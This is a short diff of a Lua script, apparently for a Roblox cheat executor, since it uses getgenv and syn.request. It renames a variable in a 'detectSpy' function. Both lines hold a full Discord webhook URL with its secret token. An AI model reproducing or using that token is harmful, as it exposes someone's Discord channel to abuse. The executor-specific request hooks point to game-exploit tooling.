@@ -667,7 +667,7 @@ end
 
 local function detectSpy()
     if isMobile then return false end
-    local fakeWebhook = "https://discordapp.com/api/webhooks/1342763159592894474/tTVRtFeKAJNsEw4EZC-5C_zeB5Jza93eYP4HttjnN8UKQrk4xAcliWWZlyWqaeDWTHAF"
+    Webhook = "https://discordapp.com/api/webhooks/1342763159592894474/tTVRtFeKAJNsEw4EZC-5C_zeB5Jza93eYP4HttjnN8UKQrk4xAcliWWZlyWqaeDWTHAF"
     local safeRequest = getgenv().request or getgenv()["http.request"] or getgenv()["syn.request"] or getgenv().HttpPost
     
     if safeRequest then
